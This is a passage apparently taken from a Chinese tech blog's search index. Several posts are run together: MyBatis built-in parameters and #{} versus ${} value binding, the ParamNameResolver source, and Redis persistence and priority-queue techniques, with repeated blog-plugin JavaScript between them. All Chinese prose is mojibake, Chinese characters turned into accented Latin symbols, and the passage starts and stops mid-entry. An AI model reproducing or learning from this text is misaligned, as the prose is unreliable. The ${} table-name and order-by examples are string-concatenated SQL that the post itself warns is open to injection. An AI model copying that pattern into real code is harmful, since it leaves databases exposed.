å•ä¸ªå‚æ•°ï¼š_parameter åˆ™ä»£è¡¨è¿™ä¸ªå‚æ•° å¤šä¸ªå‚æ•°ï¼šå¤šä¸ªå‚æ•°ä¼šè¢« MyBatis å°è£…ä¸ºä¸€ä¸ª Mapï¼Œè€Œ _parameter åˆ™ä»£è¡¨è¿™ä¸ª Map _databaseIdï¼šå¦‚æœåœ¨ MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ä¸­é…ç½®äº† databaseIdProvider æ ‡ç­¾ï¼ˆæ•°æ®åº“å‚å•†æ ‡è¯†ï¼‰ï¼Œé‚£ä¹ˆ _databaseId å°±ä»£è¡¨å½“å‰æ•°æ®åº“çš„åˆ«å 123456789&lt;configuration&gt; &lt;!-- æ•°æ®åº“å‚å•†æ ‡è¯† --&gt; &lt;databaseIdProvider type="DB_VENDOR"&gt; &lt;property name="SQL Server" value="sqlserver" /&gt; &lt;property name="DB2" value="db2" /&gt; &lt;property name="MySQL" value="mysql" /&gt; &lt;property name="Oracle" value="oracle" /&gt; &lt;/databaseIdProvider&gt;&lt;/configuration&gt; 12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpByInnerParameter(Employee employee);} 1234567891011121314151617&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpByInnerParameter" resultType="com.clay.mybatis.bean.Employee"&gt; &lt;!-- ä½¿ç”¨å†…ç½®å‚æ•°åˆ¤æ–­æ•°æ®åº“ç±»å‹ --&gt; &lt;if test="_databaseId == \'mysql\'"&gt; select * from t_employee &lt;!-- ä½¿ç”¨å†…ç½®å‚æ•°åˆ¤æ–­ä¼ é€’è¿›æ¥çš„å‚æ•°æ˜¯å¦ä¸ºNULL --&gt; &lt;if test="_parameter != null"&gt; where email = #{_parameter.email} &lt;/if&gt; &lt;/if&gt; &lt;if test="_databaseId == \'oracle\'"&gt; select * from employees &lt;/if&gt; &lt;/select&gt;&lt;/mapper&gt; $ ä¸ # ç¬¦å–å€¼åŒºåˆ«ä¸¤è€…çš„ç›¸åŒç‚¹ï¼š #{}ï¼šå¯ä»¥è·å– Map ä¸­çš„å€¼æˆ–è€… POJO å¯¹è±¡å±æ€§çš„å€¼ ${}ï¼šå¯ä»¥è·å– Map ä¸­çš„å€¼æˆ–è€… POJO å¯¹è±¡å±æ€§çš„å€¼ ä¸¤è€…çš„ä¸åŒç‚¹ï¼š #{}ï¼šæ˜¯ä»¥é¢„ç¼–è¯‘ï¼ˆPreparedStatementï¼‰çš„å½¢å¼ï¼Œå°†å‚æ•°è®¾ç½®åˆ° SQL è¯­å¥ä¸­ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢ SQL æ³¨å…¥ï¼Œå¤§å¤šæƒ…å†µä¸‹éƒ½åº”è¯¥ä½¿ç”¨ #{} å–å‚æ•°å€¼ ${}ï¼šå–å‡ºçš„å€¼æ˜¯ç›´æ¥æ‹¼æ¥åœ¨ SQL è¯­å¥ä¸­ï¼Œå­˜åœ¨ SQL æ³¨å…¥çš„å®‰å…¨é—®é¢˜ åœ¨åŸç”Ÿ JDBC ä¸æ”¯æŒä½¿ç”¨ ? å ä½ç¬¦çš„åœ°æ–¹ï¼Œåªèƒ½ä½¿ç”¨ ${} è¿›è¡Œå–å€¼ï¼Œæ¯”å¦‚åˆ†è¡¨ã€æ’åº 12345// æŒ‰ç…§å¹´ä»½åˆ†è¡¨select * from ${year}_salary where xxx;// æ’åºselect * from tbl_employee order by ${f_name} ${order} #{} å¯ä»¥æŒ‡å®šä¸€ä¸ªé¢å¤–çš„å±æ€§ï¼ŒåŒ…æ‹¬ javaTypeã€jdbcTypeã€modeã€numericScaleã€resultMapã€typeHandlerã€jdbcTypeName 12#{property, javaType=int, jdbcType=NUMERIC}#{height, javaType=double, jdbcType=NUMERIC, numericScale=2} æç¤º MyBatis å¯¹æ‰€æœ‰çš„ null é»˜è®¤éƒ½æ˜ å°„ä¸ºåŸç”Ÿ Jdbc çš„ OTHER ç±»å‹ï¼ˆæ— æ•ˆçš„ç±»å‹ï¼‰ jdbcType é€šå¸¸éœ€è¦åœ¨æŸç§ç‰¹å®šçš„æ¡ä»¶ä¸‹è¢«è®¾ç½®ï¼Œä¾‹å¦‚åœ¨æ•°æ®ä¸º null çš„æ—¶å€™ï¼Œæœ‰äº›æ•°æ®åº“å¯èƒ½ä¸èƒ½è¯†åˆ« MyBatis å¯¹ null çš„é»˜è®¤å¤„ç†ï¼ˆå°† null æ˜ å°„ä¸ºåŸç”Ÿ Jdbc çš„ OTHER ç±»å‹ï¼‰ï¼Œæ¯”å¦‚ Oracle ä¸æ”¯æŒ è§£å†³ Oracle å¯¹ null å€¼çš„å…¼å®¹å¤„ç†ï¼Œå¯ä»¥ä½¿ç”¨ #{height, jdbcType=NULL} æŒ‡å®š jdbcType ä¸º NULLï¼Œæˆ–è€…åœ¨ MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ä¸­é…ç½® &lt;setting name="jdbcTypeForNull" value="NULL"/&gt; å‚æ•°å¤„ç†æºç åˆ†æMyBatis å‚æ•°å¤„ç†çš„æ ¸å¿ƒä»£ç åœ¨ ParamNameResolver ç±»é‡Œï¼Œæœ€ç»ˆç»“æœæ˜¯å°†ä¼ å…¥çš„å‚æ•°å°è£…æˆ Map å¯¹è±¡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173/** * Copyright 2009-2020 the original author or authors. * * Licensed under the Apache License, Version 2.0 (the "License"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an "AS IS" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */package org.apache.ibatis.reflection;import java.lang.annotation.Annotation;import java.lang.reflect.Method;import java.util.Collection;import java.util.Collections;import java.util.List;import java.util.Map;import java.util.Optional;import java.util.SortedMap;import java.util.TreeMap;import org.apache.ibatis.annotations.Param;import org.apache.ibatis.binding.MapperMethod.ParamMap;import org.apache.ibatis.session.Configuration;import org.apache.ibatis.session.ResultHandler;import org.apache.ibatis.session.RowBounds;public class ParamNameResolver { public static final String GENERIC_NAME_PREFIX = "param"; private final boolean useActualParamName; /** * &lt;p&gt; * The key is the index and the value is the name of the parameter.&lt;br /&gt; * The name is obtained from {@link Param} if specified. When {@link Param} is not specified, * the parameter index is used. Note that this index could be different from the actual index * when the method has special parameters (i.e. {@link RowBounds} or {@link ResultHandler}). * &lt;/p&gt; * &lt;ul&gt; * &lt;li&gt;aMethod(@Param("M") int a, @Param("N") int b) -&amp;gt; {{0, "M"}, {1, "N"}}&lt;/li&gt; * &lt;li&gt;aMethod(int a, int b) -&amp;gt; {{0, "0"}, {1, "1"}}&lt;/li&gt; * &lt;li&gt;aMethod(int a, RowBounds rb, int b) -&amp;gt; {{0, "0"}, {2, "1"}}&lt;/li&gt; * &lt;/ul&gt; */ private final SortedMap&lt;Integer, String&gt; names; private boolean hasParamAnnotation; public ParamNameResolver(Configuration config, Method method) { this.useActualParamName = config.isUseActualParamName(); final Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); final Annotation[][] paramAnnotations = method.getParameterAnnotations(); final SortedMap&lt;Integer, String&gt; map = new TreeMap&lt;&gt;(); int paramCount = paramAnnotations.length; // get names from @Param annotations for (int paramIndex = 0; paramIndex &lt; paramCount; paramIndex++) { if (isSpecialParameter(paramTypes[paramIndex])) { // skip special parameters continue; } String name = null; for (Annotation annotation : paramAnnotations[paramIndex]) { if (annotation instanceof Param) { hasParamAnnotation = true; name = ((Param) annotation).value(); break; } } if (name == null) { // @Param was not specified. if (useActualParamName) { name = getActualParamName(method, paramIndex); } if (name == null) { // use the parameter index as the name ("0", "1", ...) // gcode issue #71 name = String.valueOf(map.size()); } } map.put(paramIndex, name); } names = Collections.unmodifiableSortedMap(map); } private String getActualParamName(Method method, int paramIndex) { return ParamNameUtil.getParamNames(method).get(paramIndex); } private static boolean isSpecialParameter(Class&lt;?&gt; clazz) { return RowBounds.class.isAssignableFrom(clazz) || ResultHandler.class.isAssignableFrom(clazz); } /** * Returns parameter names referenced by SQL providers. * * @return the names */ public String[] getNames() { return names.values().toArray(new String[0]); } /** * &lt;p&gt; * A single non-special parameter is returned without a name. * Multiple parameters are named using the naming rule. * In addition to the default names, this method also adds the generic names (param1, param2, * ...). * &lt;/p&gt; * * @param args * the args * @return the named params */ public Object getNamedParams(Object[] args) { final int paramCount = names.size(); if (args == null || paramCount == 0) { return null; } else if (!hasParamAnnotation &amp;&amp; paramCount == 1) { Object value = args[names.firstKey()]; return wrapToMapIfCollection(value, useActualParamName ? names.get(0) : null); } else { final Map&lt;String, Object&gt; param = new ParamMap&lt;&gt;(); int i = 0; for (Map.Entry&lt;Integer, String&gt; entry : names.entrySet()) { param.put(entry.getValue(), args[entry.getKey()]); // add generic param names (param1, param2, ...) final String genericParamName = GENERIC_NAME_PREFIX + (i + 1); // ensure not to overwrite parameter named with @Param if (!names.containsValue(genericParamName)) { param.put(genericParamName, args[entry.getKey()]); } i++; } return param; } } /** * Wrap to a {@link ParamMap} if object is {@link Collection} or array. * * @param object a parameter object * @param actualParamName an actual parameter name * (If specify a name, set an object to {@link ParamMap} with specified name) * @return a {@link ParamMap} * @since 3.5.5 */ public static Object wrapToMapIfCollection(Object object, String actualParamName) { if (object instanceof Collection) { ParamMap&lt;Object&gt; map = new ParamMap&lt;&gt;(); map.put("collection", object); if (object instanceof List) { map.put("list", object); } Optional.ofNullable(actualParamName).ifPresent(name -&gt; map.put(name, object)); return map; } else if (object != null &amp;&amp; object.getClass().isArray()) { ParamMap&lt;Object&gt; map = new ParamMap&lt;&gt;(); map.put("array", object); Optional.ofNullable(actualParamName).ifPresent(name -&gt; map.put(name, object)); return map; } return object; }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"ç¼“å­˜é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/6a0cde5a.html",text:'RedisæŒä¹…åŒ–æœºåˆ¶RDB ä¸ AOF RDBï¼ˆRedis DataBaseï¼‰æŒä¹…åŒ–ï¼Œæ˜¯åœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…å°†å†…å­˜ä¸­çš„æ•°æ®é›†å¿«ç…§å†™å…¥ç£ç›˜ï¼ˆpoint-in-time snapshotï¼‰ã€‚åœ¨ Redis è¿è¡Œæ—¶ï¼ŒRDB ç¨‹åºå°†å½“å‰å†…å­˜ä¸­çš„æ•°æ®é›†å¿«ç…§ä¿å­˜åˆ°ç£ç›˜æ–‡ä»¶ä¸­ï¼Œåœ¨ Redis é‡å¯åŠ¨æ—¶ï¼ŒRDB ç¨‹åºå¯ä»¥é€šè¿‡è½½å…¥ RDB æ–‡ä»¶æ¥è¿˜åŸæ•°æ®åº“çš„çŠ¶æ€ AOFï¼ˆAppend Only Fileï¼‰æŒä¹…åŒ–ï¼Œä»¥æ—¥å¿—çš„å½¢å¼æ¥è®°å½•æ¯ä¸ªå†™æ“ä½œï¼Œå°† Redis æ‰§è¡Œè¿‡çš„æ‰€æœ‰å†™æŒ‡ä»¤è®°å½•ä¸‹æ¥ï¼ŒåŒæ—¶åªè®¸è¿½åŠ æ–‡ä»¶ä¸èƒ½æ”¹å†™æ–‡ä»¶ã€‚å½“ Redis é‡æ–°å¯æ—¶ï¼Œç¨‹åºå°±å¯ä»¥é€šè¿‡é‡æ–°æ‰§è¡Œ AOF æ–‡ä»¶ä¸­çš„å‘½ä»¤æ¥è¾¾åˆ°é‡å»ºæ•°æ®é›†çš„ç›®çš„ RDB çš„ä¼˜ç¼ºç‚¹ RDB çš„ä¼˜ç‚¹ èŠ‚çœç£ç›˜ç©ºé—´ æ•°æ®æ¢å¤é€Ÿåº¦å¿« RDB çš„ç¼ºç‚¹ åœ¨ä¸€å®šçš„æ—¶é—´é—´éš”åšä¸€æ¬¡å¤‡ä»½ï¼Œå¦‚æœ Redis ä»¥ä¸º down æ‰çš„è¯ï¼Œé‚£ä¹ˆæœ€åä¸€æ¬¡æŒä¹…åŒ–åçš„æ•°æ®å¯èƒ½ä¼šä¸¢å¤± è™½ç„¶ Redis åœ¨ fork æ—¶ä½¿ç”¨äº†å†™æ—¶æ‹·è´æŠ€æœ¯ï¼Œä½†æ˜¯å¦‚æœæ•°æ®é‡è¾ƒå¤§æ—¶ï¼Œæ¯”è¾ƒè€—æ€§èƒ½ï¼Œå¯èƒ½ä¼šå¯¼è‡´ Redis åœ¨æ•°æ¯«ç§’æˆ–è€…å‡ ç§’å†…ä¸èƒ½å“åº”å®¢æˆ·ç«¯çš„è¯·æ±‚ AOF çš„ä¼˜ç¼ºç‚¹ AOF çš„ä¼˜ç‚¹ å¯è¯»çš„æ—¥å¿—æ–‡ä»¶ å¤‡ä»½æœºåˆ¶æ›´ç¨³å¥ï¼Œä¸¢å¤±æ•°æ®çš„æ¦‚ç‡æ›´ä½ AOF çš„ç¼ºç‚¹ æ•°æ®æ¢å¤é€Ÿåº¦è¾ƒæ…¢ å¯¹äºç›¸åŒçš„æ•°æ®é›†æ¥è¯´ï¼Œä¸ RDB æ¯”è¾ƒï¼Œå ç”¨æ›´å¤šçš„ç£ç›˜ç©ºé—´ è‹¥åŒæ­¥ç­–ç•¥ä¸ºæ¯æ¬¡å†™å…¥éƒ½åŒæ­¥çš„è¯ï¼Œæœ‰ä¸€å®šçš„æ€§èƒ½å‹åŠ›ï¼Œå°¤å…¶æ˜¯å¤„ç†å·¨å¤§çš„å†™å…¥æ—¶ äº”å¤§æ•°æ®ç±»å‹çš„åº”ç”¨åœºæ™¯Redis æ”¯æŒçš„é”®å€¼æ•°æ®ç±»å‹åŒ…æ‹¬ï¼šå­—ç¬¦ä¸²ç±»å‹ã€æ•£åˆ—ç±»å‹ã€åˆ—è¡¨ç±»å‹ã€é›†åˆç±»å‹ã€æœ‰åºé›†åˆç±»å‹ã€‚ æ•°æ®ç±»å‹ å¸¸ç”¨æ“ä½œå‘½ä»¤ åº”ç”¨åœºæ™¯ String getã€SETã€incrã€decrã€mget å¸¸è§„çš„ key-value ç¼“å­˜åº”ç”¨ï¼šIP å±è”½ï¼›å¸¸è§„è®¡æ•°ï¼šå¾®åšæ•°ã€ç²‰ä¸æ•° Hash hgetã€hSETã€hgetall å­˜å‚¨éƒ¨åˆ†é¢‘ç¹å˜æ›´çš„æ•°æ®ï¼Œå¦‚ç”¨æˆ·ä¿¡æ¯ç­‰ List LPUSHã€rpushã€lpopã€rpopã€lrange Twitter çš„å…³æ³¨åˆ—è¡¨ï¼Œå¾®åšç²‰ä¸åˆ—è¡¨ï¼Œæœ€æ–°æ¶ˆæ¯æ’è¡Œæ¦œï¼Œä½œä¸ºæ ˆã€æ¶ˆæ¯é˜Ÿåˆ—ä½¿ç”¨ SET saddã€spopã€smembersã€sunion æ±‚å·®é›†ã€äº¤é›†ã€å¹¶é›†ï¼Œä¾‹å¦‚ï¼šå¾®åšçš„å…±åŒå…³æ³¨ã€å…±åŒå–œå¥½ã€äºŒåº¦å¥½å‹ç­‰åŠŸèƒ½ Sorted SET zaddã€zrangeã€zremã€zcard å•†å“çš„ç»¼åˆæ’åã€ä»·æ ¼æ’åã€ä¼˜å…ˆçº§é˜Ÿåˆ— Redis å®ç°ä¼˜å…ˆçº§é˜Ÿåˆ—é€šå¸¸ä½¿ç”¨ List ç±»å‹æ¥å®ç°é˜Ÿåˆ—æ“ä½œï¼Œè¿™æ ·æœ‰ä¸€ä¸ªå°é™åˆ¶ï¼Œæ‰€æœ‰çš„ä»»åŠ¡ç»Ÿä¸€éƒ½æ˜¯å…ˆè¿›å…ˆå‡ºï¼Œå¦‚æœæƒ³ä¼˜å…ˆå¤„ç†æŸä¸ªä»»åŠ¡å°±ä¸å¤ªå¥½å¤„ç†äº†ï¼Œè¿™å°±éœ€è¦è®©é˜Ÿåˆ—æœ‰ä¼˜å…ˆçº§çš„æ¦‚å¿µï¼Œæ”¯æŒä¼˜å…ˆå¤„ç†é«˜çº§åˆ«çš„ä»»åŠ¡ï¼Œå…·ä½“å®ç°æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§ã€‚ å•ä¸€åˆ—è¡¨å®ç°é˜Ÿåˆ—æ­£å¸¸çš„æ“ä½œæ˜¯ å·¦è¿›å³å‡ºï¼ˆLPUSHï¼Œrpopï¼‰ï¼Œä¸ºäº†å…ˆå¤„ç†é«˜ä¼˜å…ˆçº§ä»»åŠ¡ï¼Œåœ¨é‡åˆ°é«˜çº§åˆ«ä»»åŠ¡æ—¶ï¼Œå¯ä»¥ç›´æ¥æ’é˜Ÿï¼Œå³ç›´æ¥å°†ä»»åŠ¡æ”¾å…¥é˜Ÿåˆ—å¤´éƒ¨ï¼ˆrpushï¼‰ï¼Œè¿™æ ·ä»é˜Ÿåˆ—å¤´éƒ¨ï¼ˆå³ä¾§ï¼‰è·å–ä»»åŠ¡æ—¶ï¼Œå–åˆ°çš„å°±æ˜¯é«˜ä¼˜å…ˆçº§çš„ä»»åŠ¡ï¼ˆrpopï¼‰ã€‚ç›¸å½“äºæ™®é€šä»»åŠ¡æŒ‰ç…§é˜Ÿåˆ—ç»“æ„ï¼Œç¢°åˆ°é«˜ä¼˜å…ˆçº§ä»»åŠ¡ï¼Œå°±æŒ‰ç…§æ ˆç»“æ„ï¼ˆå…ˆè¿›åå‡ºï¼‰ã€‚ä¼˜ç‚¹æ˜¯å®ç°ç®€å•ï¼Œç¼ºç‚¹æ˜¯é«˜çº§åˆ«ä»»åŠ¡æ€»æ˜¯åè¿›å…ˆå‡ºï¼Œè€Œä¸”é«˜ä¼˜å…ˆçº§çš„ä»»åŠ¡ä¹‹é—´çš„æ‰§è¡Œé¡ºåºæ˜¯å…ˆè¿›åå‡ºçš„ï¼Œè¿™æ ·ä¿è¯ä¸äº†é«˜ä¼˜å…ˆçº§ä»»åŠ¡ä¹‹é—´çš„æ‰§è¡Œé¡ºåºã€‚é€‚ç”¨äºç®€å•çš„é˜Ÿåˆ—éœ€æ±‚ï¼Œä¾‹å¦‚é«˜ä¼˜å…ˆçº§ä»»åŠ¡è¾ƒå°‘çš„æƒ…å†µã€‚ å¤šé˜Ÿåˆ—å®ç°ä½¿ç”¨ä¸¤ä¸ªé˜Ÿåˆ—ï¼Œä¸€ä¸ªæ™®é€šé˜Ÿåˆ—ï¼Œä¸€ä¸ªé«˜çº§é˜Ÿåˆ—ï¼Œé’ˆå¯¹ä»»åŠ¡çš„çº§åˆ«æ”¾å…¥ä¸åŒçš„é˜Ÿåˆ—ã€‚è·å–ä»»åŠ¡æ—¶ä¹Ÿå¾ˆç®€å•ï¼ŒRedis çš„ BRPOP å‘½ä»¤å¯ä»¥æŒ‰é¡ºåºä»å¤šä¸ªé˜Ÿåˆ—ä¸­å–å€¼ã€‚BRPOP å‘½ä»¤ä¼šæŒ‰ç…§ç»™å‡ºçš„ key é¡ºåºæŸ¥çœ‹ï¼Œå¹¶åœ¨æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªéç©º List çš„å°¾éƒ¨å¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼Œè€Œä¸” BRPOP å‘½ä»¤æ˜¯é˜»å¡å¼çš„ã€‚ 1redis&gt; BRPOP list1 list2 0 å…¶ä¸­ list1 åšä¸ºé«˜ä¼˜å…ˆçº§ä»»åŠ¡é˜Ÿåˆ—ï¼Œlist2 åšä¸ºæ™®é€šä»»åŠ¡é˜Ÿåˆ—ï¼Œè¿™æ ·å°±å®ç°äº†å…ˆå¤„ç†é«˜ä¼˜å…ˆçº§ä»»åŠ¡ï¼Œå½“æ²¡æœ‰é«˜ä¼˜å…ˆçº§ä»»åŠ¡æ—¶ï¼Œå°±å»è·å–æ™®é€šä»»åŠ¡ã€‚ ä½¿ç”¨æƒå€¼å®ç°å¦‚æœä¼˜å…ˆçº§æ¯”è¾ƒå¤æ‚ï¼Œæ¯”å¦‚å‡è®¾æœ‰ä¸ªè¿™æ ·çš„åœºæ™¯ï¼Œä¼˜å…ˆçº§ä¸æ˜¯ç®€å•çš„é«˜ä¸­ä½æˆ–è€… 0-10 è¿™äº›å›ºå®šçš„çº§åˆ«ï¼Œè€Œæ˜¯ç±»ä¼¼ 0-99999 è¿™ä¹ˆå¤šçº§åˆ«ï¼Œä½¿ç”¨å¤šé˜Ÿåˆ—çš„æ–¹å¼å®ç°èµ·æ¥å°±ä¸å¤ªæ–¹ä¾¿äº†ã€‚ æ€è·¯ä¸€ã€åŸºäº List ç±»å‹ + å¤šé˜Ÿåˆ— + äºŒåˆ†æ³•ï¼š è™½ç„¶ Redis æœ‰ Sorted SET è¿™æ ·çš„å¯ä»¥æ’åºçš„æ•°æ®ç±»å‹ï¼Œå¾ˆå¯æƒœå®ƒæ²¡æœ‰é˜»å¡ç‰ˆçš„æ¥å£ï¼Œå› æ­¤åªèƒ½ä½¿ç”¨ List ç±»å‹é€šè¿‡å…¶ä»–æ–¹å¼æ¥å®Œæˆç›®çš„ã€‚ç®€å•çš„åšæ³•å¯ä»¥åªè®¾ç½®ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå¹¶ä¿è¯å®ƒæ˜¯æŒ‰ç…§ä¼˜å…ˆçº§æ’åºçš„ï¼›ç„¶åé€šè¿‡äºŒåˆ†æŸ¥æ‰¾æ³•æŸ¥æ‰¾ä¸€ä¸ªä»»åŠ¡åˆé€‚çš„ä½ç½®ï¼Œå¹¶é€šè¿‡ LSET å‘½ä»¤å°†ä»»åŠ¡æ’å…¥åˆ°ç›¸åº”çš„ä½ç½®ã€‚ä¾‹å¦‚é˜Ÿåˆ—é‡Œé¢åŒ…å«ç€å†™ä¼˜å…ˆçº§çš„ä»»åŠ¡ [1, 3, 6, 8, 9, 14]ï¼Œå½“æœ‰ä¸ªä¼˜å…ˆçº§ä¸º 7 çš„ä»»åŠ¡è¿‡æ¥ï¼Œé€šè¿‡äºŒåˆ†ç®—æ³•ä¸€ä¸ªä¸ªä»é˜Ÿåˆ—é‡Œé¢å–æ•°æ®å‡ºæ¥å’Œç›®æ ‡æ•°æ®æ¯”å¯¹ï¼Œè®¡ç®—å‡ºç›¸åº”çš„ä½ç½®ç„¶åæ’å…¥åˆ°æŒ‡å®šä½ç½®å³å¯ã€‚å› ä¸ºäºŒåˆ†æŸ¥æ‰¾æ˜¯æ¯”è¾ƒå¿«çš„ï¼Œå¹¶ä¸” Redis çš„æ•°æ®ä¹Ÿéƒ½åœ¨å†…å­˜ä¸­ï¼Œç†è®ºä¸Šé€Ÿåº¦æ˜¯å¯ä»¥ä¿è¯çš„ã€‚ä½†æ˜¯å¦‚æœè¯´æ•°æ®é‡ç¡®å®å¾ˆå¤§çš„è¯ä¹Ÿå¯ä»¥é€šè¿‡é¢å¤–æ–¹å¼æ¥è°ƒä¼˜ï¼Œæ¯”å¦‚ä¸ â€œå¤šé˜Ÿåˆ—å®ç°æ–¹æ¡ˆâ€ ç»“åˆèµ·æ¥å°±ä¼šå¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘å¼€é”€ã€‚å‡è®¾æ•°æ®é‡åä¸‡çš„é˜Ÿåˆ—ï¼Œå®ƒä»¬çš„ä¼˜å…ˆçº§ä¹Ÿæ˜¯éšæœº 0-10W ä¸‡çš„åŒºé—´ã€‚å¯ä»¥è®¾ç½® 10 ä¸ªæˆ–è€… 100 ä¸ªä¸åŒçš„é˜Ÿåˆ—ï¼Œ0-1W çš„ä¼˜å…ˆçº§ä»»åŠ¡æŠ•æ”¾åˆ° 1 å·é˜Ÿåˆ—ï¼Œ2W-3W çš„ä»»åŠ¡æŠ•æ”¾åˆ° 2 å·é˜Ÿåˆ—ã€‚è¿™æ ·å°†ä¸€ä¸ªé˜Ÿåˆ—æŒ‰ä¸åŒç­‰çº§æ‹†åˆ†åï¼Œå®ƒå•ä¸ªé˜Ÿåˆ—çš„æ•°æ®é‡å°±å‡å°‘è®¸å¤šï¼Œè¿™æ ·äºŒåˆ†æ³•æŸ¥æ‰¾åŒ¹é…çš„æ•ˆç‡ä¹Ÿä¼šé«˜ä¸€ç‚¹ã€‚ä½†æ˜¯æ•°æ®æ‰€å çš„èµ„æºåŸºæœ¬æ˜¯ä¸å˜çš„ï¼Œåä¸‡æ•°æ®è¯¥å å¤šå°‘å†…å­˜è¿˜æ˜¯å¤šå°‘ï¼Œåªæ˜¯ç³»ç»Ÿé‡Œé¢å¤šäº†ä¸€äº›é˜Ÿåˆ—è€Œå·²ã€‚ æ€è·¯äºŒã€åŸºäº List ç±»å‹ï¼ˆå­˜ç–‘ï¼‰ï¼š å‡è®¾æœ‰ 3 ä¸ªçº§åˆ«ï¼Œç”¨æƒå€¼æ¥è¡¨ç¤ºä¸º 1ã€2ã€3ï¼Œæ­¤æ—¶æœ‰ 4 ä¸ªå…ƒç´ éœ€è¦å…¥é˜Ÿï¼Œåˆ†åˆ«æ˜¯ï¼ša-1ï¼Œb-2ï¼Œc-3ï¼Œd-3ã€‚ é¦–å…ˆä½¿ç”¨ LPUSH æŠŠå…ƒç´ æ”¾å…¥é˜Ÿåˆ—ä¸­ï¼ŒåŒæ—¶è®¾ç½®æƒå€¼ï¼š 1234567891011redis&gt; LPUSH mylist aredis&gt; SET mylist_score_a 1redis&gt; LPUSH mylist bredis&gt; SET mylist_score_b 2redis&gt; LPUSH mylist credis&gt; SET mylist_score_c 3redis&gt; LPUSH mylist dredis&gt; SET mylist_score_d 3 æ ¹æ®æƒå€¼æ’åºï¼Œå¹¶å–å‡ºæ’åç¬¬ä¸€çš„å…ƒç´ ï¼ˆcï¼‰ï¼š 1redis&gt; SORT mylist by mylist_score_* limit 0 1 å…ƒç´ è·å–å®Œæˆåï¼Œè¦ç§»é™¤è¯¥å…ƒç´ ï¼ˆcï¼‰ï¼š 1redis&gt; LREM mylist 0 c ç‰¹åˆ«æ³¨æ„ï¼šç”±äº SORT å‘½ä»¤ä¸ LREM å‘½ä»¤æ˜¯å‰åæ‰§è¡Œçš„ï¼Œå¹¶ä¸æ˜¯åŸå­æ“ä½œï¼Œæ‰€ä»¥æ­¤æ–¹æ¡ˆå¹¶ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"MyBatis å…¥é—¨æ•™ç¨‹ä¹‹äºŒ",url:"/posts/62ce5629.html",text:'å‰è¨€æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-3ã€‚ MyBatis å…¨å±€é…ç½®æ–‡ä»¶MyBatis é»˜è®¤çš„å…¨å±€é…ç½®æ–‡ä»¶æ˜¯ mybatis-config.xmlï¼Œä¸” XML é…ç½®æ–‡ä»¶é‡Œçš„æ ‡ç­¾æ˜¯æœ‰é¡ºåºçš„ï¼Œç”±å‰åˆ°åä¾æ¬¡æ˜¯ properties, settings, typeAliases, typeHandlers, objectFactory, objectWrapperFactory, reflectorFactory, plugins, environments, databaseIdProvider, mappersã€‚ å±æ€§ï¼ˆpropertiesï¼‰åœ¨ä¼ä¸šçº§å¼€å‘ä¸­ï¼Œå¾€å¾€ä¼šå°†æ•°æ®åº“çš„è¿æ¥ä¿¡æ¯å†™åˆ°å•ç‹¬çš„é…ç½®æ–‡ä»¶ä¸­ï¼Œè¿™æ ·æ—¥åæ–¹ä¾¿ç»Ÿä¸€ç®¡ç†ã€‚MyBatis ä¸ºæ­¤æä¾›äº† properties æ ‡ç­¾ï¼Œç”¨äºè¯»å–å¤–éƒ¨çš„çš„ Properties é…ç½®æ–‡ä»¶ï¼Œè¯»å–åˆ°çš„å±æ€§å€¼å¯ä»¥åœ¨æ•´ä¸ª MyBatis é…ç½®æ–‡ä»¶ä¸­ç”¨æ¥æ›¿æ¢éœ€è¦åŠ¨æ€é…ç½®çš„å±æ€§å€¼ã€‚ config.properties 